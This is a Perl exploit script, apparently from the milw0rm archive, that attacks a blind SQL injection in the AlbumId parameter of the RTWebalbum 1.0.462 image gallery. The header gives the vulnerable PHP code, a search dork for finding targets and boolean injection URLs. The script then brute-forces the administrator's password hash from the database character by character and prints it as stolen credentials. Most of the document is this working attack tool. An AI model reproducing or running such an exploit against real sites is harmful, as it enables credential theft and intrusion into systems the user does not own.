#!/usr/bin/perl
#***********************************************************************************************
#***********************************************************************************************
#**	       										      **
#**  											      **
#**     [] [] []  [][][][>  []     []  [][  ][]     []   [][]]  []  [>  [][][][>  [][][][]    **
#**     || || ||  []        [][]   []   []  []     []   []      [] []   []	 []   []      **
#   [>  [][][][]  [][][][>  [] []  []   []  []   [][]  []       [][]    [][][][>  []    []    **
#**  [-----[]-----[][][][>--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][>--[][][][]---\ 
#**==[>    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  >>--
#**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
#   [>   [[[]]]   [][][][>  [][]   [] [][[] [[]]  [][]  [][][]  []  [>  [][][][> <][]   []    
#**							                                      **
#**    											      **
#**                          Â¡VIVA SPAIN!...Â¡GANAREMOS EL MUNDIAL!...o.O                      **
#**					  Â¡PROUD TO BE SPANISH!	                              **
#**											      **
#***********************************************************************************************
#***********************************************************************************************
#
#----------------------------------------------------------------------------------------------
#|       	   	    (GET var 'AlbumID') BLIND SQL INJECTION		              |
#|--------------------------------------------------------------------------------------------|
#|                         	      | RTWebalbum 1.0.462  |		 		      |
#|  CMS INFORMATION:		       ---------------------				      |
#|										              |
#|-->WEB: http://rtwebalbum.x12.pl/				   		              |
#|-->DOWNLOAD: http://sourceforge.net/projects/rtwebalbum/	   		              |
#|-->DEMO: http://rtwebalbum.x12.pl/							      |
#|-->CATEGORY: CMS / Image Gallery							      |
#|-->DESCRIPTION: Free web album scripts in PHP. Include administration panel to easy         |
#| 		manage content of album. If you decide to use this web...		      |
#|											      |
#|  CMS VULNERABILITY:									      |
#|											      |
#|-->TESTED ON: firefox 3 								      |
#|-->DORK: "2007 Rafal Kucharski"							      |
#|-->CATEGORY: BLIND SQL INJECTION/ PERL EXPLOIT					      |
#|-->AFFECT VERSION: v1.0.462 (maybe <= ?)						      |
#|-->Discovered Bug date: 2009-05-04							      |
#|-->Reported Bug date: 2009-05-04							      |
#|-->Fixed bug date: 2009-05-06								      |
#|-->Info patch (1.0.574): http://sourceforge.net/projects/rtwebalbum			      |   
#|-->Author: YEnH4ckEr									      |
#|-->mail: y3nh4ck3r[at]gmail[dot]com							      |
#|-->WEB/BLOG: N/A									      |
#|-->COMMENT: A mi novia Marijose...hermano,cunyada, padres (y amigos xD) por su apoyo.       |
#|-->EXTRA-COMMENT: Gracias por aguantarme a todos! (Te kiero xikitiya!)		      |
#----------------------------------------------------------------------------------------------
#
#-----------
#BUG FILES:
#-----------
#
#Path --> [HOME_PATH]/index.php
#It contents:
#	...
#
#	if (!isset($_GET['AlbumId'])) {
#		$AlbumId = 0;
#	} else {
#		$AlbumId = $_GET['AlbumId'];
#	}
#
#	...
#
#
#if ($AlbumId <> 0){
#
#	$picArr = array();
#	$query = "SELECT * FROM pictures WHERE AlbumID=".$AlbumId." order by ID";
#	$result=mysql_query($query);
#
#	...
#}	
#------------
#CONDITIONS:
#------------
#
#
#**Exist a valid image with title
#
#**gpc_magic_quotes=off/on
#
#---------------------------------------
#PROOF OF CONCEPT (BLIND SQL INJECTION):
#---------------------------------------
#
#http://[HOST]/[HOME_PATH]/index.php?AlbumId=3+AND+1=1%23 --> title is displayed (true)
#
#http://[HOST]/[HOME_PATH]/index.php?AlbumId=3+AND+1=0%23 --> title is not displayed (false)
#
#
#######################################################################
#######################################################################
##*******************************************************************##
##  SPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!  ##
##*******************************************************************##
##-------------------------------------------------------------------##
##*******************************************************************##
##     GREETZ TO: JosS, Ulises2k and all spanish Hack3Rs community!  ##
##*******************************************************************##
#######################################################################
#######################################################################
#
#-------------------EOF--INFO------------------------------->>>ENJOY IT!
#
use LWP::UserAgent;
use HTTP::Request;
#Subroutines
sub lw
{
	my $SO = $^O;
	my $linux = "";
	if (index(lc($SO),"win")!=-1){
		$linux="0";
	}else{
		$linux="1";
	}		
	if($linux){
		system("clear");
	}
	else{
		system("cls");
		system ("title RTWebalbum v1.0.462 (GET var 'AlbumID') BLIND SQL Injection Exploit");
		system ("color 03");
	}
}
sub request {
	my $userag = LWP::UserAgent->new;
	$userag -> agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
	my $request = HTTP::Request -> new(GET => $_[0]);
	my $outcode= $userag->request($request)->as_string;
	return $outcode;
}
sub helper {
	print "\n\t[XxX] RTWebalbum v1.0.462 (GET var 'AlbumID') BLIND SQL Injection Exploit\n";
	print "\t[XxX] USAGE MODE: [XxX]\n";
	print "\t[XxX] perl $0 [HOST] [PATH] [AlbumID]\n";
	print "\t[XxX] [HOST]: Web.\n";
	print "\t[XxX] [PATH]: Home Path. Not path: no-path\n";
	print "\t[XxX] [AlbumID]: Valid AlbumID.\n";
	print "\t[XxX] Example: perl $0 'www.example.es' 'rtwebalbum' '1'\n"; 
}
sub error {
	print "\t-----------------------------------------------------------------\n";
	print "\tWEB IS NOT VULNERABLE!\n";
	print "\tMaybe --> \n";
	print "\t1.-Patched\n";
	print "\t2.-AlbumID doesn't exist\n";
	print "\t3.-AlbumID hasn't available image\n";
	print "\t4.-output needs more characters\n";
	print "\tEXPLOIT FAILED!\n";
	print "\t-----------------------------------------------------------------\n";
}
sub testedblindsql {
	print "\t-----------------------------------------------------------------\n";
	print "\tWEB IS VULNERABLE!\n";
	print "\tTested Blind SQL Injection.\n";		
	print "\tStarting exploit...\n"; 
	print "\t-----------------------------------------------------------------\n";
}
sub password {
#Finally password...md5= 32-digits
$k=1;
	$z=48;
	while(($k<=32) && ($z<=126)){
		my $blindsql=$_[0].'+AND+ascii(substring((SELECT+password+FROM+config),'.$k.',1))='.$z.'%23';
		$output=&request($blindsql);
		if ( $output =~ (/\<div id=\"descrp\">([a-zA-Z0-9\s]+)\<\/div\>/))
		{
			$pass=$pass.chr($z);
			$k++;
			$z=47;
		}
	if($z==57)
	{
		$z=96;
	}
#new char
	$z++; 
	}
return $pass;
}
#Main
&lw;
	print "\t\t#########################################################\n\n";
	print "\t\t#########################################################\n\n";
	print "\t\t##  RTWebalbum v1.0.462 - BLIND SQL Injection Exploit  ##\n\n";
	print "\t\t##                  Author: Y3nh4ck3r                  ##\n\n";
	print "\t\t##         Contact:y3nh4ck3r[at]gmail[dot]com          ##\n\n";
	print "\t\t##                  Proud to be Spanish!               ##\n\n";
	print "\t\t#########################################################\n\n";
	print "\t\t#########################################################\n\n";
#Init variables
	my $host=$ARGV[0];
	my $path=$ARGV[1];	
	my $AlbumID=$ARGV[2];
#Build the uri
	if($path eq "no-path"){
		$finalhost="http://".$host."/index.php?AlbumId=".$AlbumID;
	}else{
		$finalhost="http://".$host."/".$path."/index.php?AlbumId=".$AlbumID;
	}
#Check all variables needed
$numArgs = $#ARGV + 1;
	if($numArgs<=2) 
	{
		&helper;
		exit(1);	
	}
$finalrequest = $finalhost;	
#Testing blind sql injection
$blindsql=$finalrequest."+AND+1=1%23"; #blind sql injection
$output=&request($blindsql);
if ( $output =~ (/\<div id=\"descrp\">([a-zA-Z0-9\s]+)\<\/div\>/))
{    
	#blind sql injection is available
	&testedblindsql;
}else{ 
	#Not injectable
	&error;
	exit(1); 
}	
#Bruteforcing password...
$passhash=&password($finalrequest);
print "\n\t\t*************************************************\n";
print "\t\t****  EXPLOIT EXECUTED (CREDENTIALS STEALER) ****\n";
print "\t\t*************************************************\n\n";
print "\t\tAdmin: admin (always)\n";
print "\t\tAdmin-password(md5 hash):".$passhash."\n\n";
print "\n\t\t<<----------------------FINISH!-------------------->>\n\n";
print "\t\t<<---------------Thanks to: y3hn4ck3r-------------->>\n\n";
print "\t\t<<------------------------EOF---------------------->>\n\n";
exit(1);
#Ok...all job done

# milw0rm.com [2009-05-08]
